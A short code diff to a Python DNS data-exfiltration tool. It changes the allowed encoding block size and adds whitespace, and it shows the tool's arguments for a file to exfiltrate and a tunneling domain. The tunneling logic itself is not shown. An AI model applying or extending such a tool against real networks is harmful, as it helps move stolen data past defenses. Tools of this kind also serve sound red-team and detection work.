@@ -22,7 +22,7 @@ def valid_file(filename):
 parser = argparse.ArgumentParser(description='Exfiltrate data using DNS.')
 parser.add_argument('--filename', '--file', '-f', '-i', '--input',
                     type=valid_file, help='File to exfiltrate. (default: none)')
-parser.add_argument('--blocksize', '-b', '-bs', type=int, choices=range(4, 17), default=12,
+parser.add_argument('--blocksize', '-b', '-bs', type=int, choices=range(4, 64), default=12,
                     help='Size of blocks to encode. (default: 12)')
 parser.add_argument('--domain', '-d', type=str, default='google.com',
                     help='Domain to use for tunneling. (default: google.com)')
@@ -90,6 +90,7 @@ def sendqueries(b64data):
                 print(str(result.response))
                 print('')
             counter += 1
+
 
 def makedots(sleepytime):
     for counter in range(0, sleepytime):
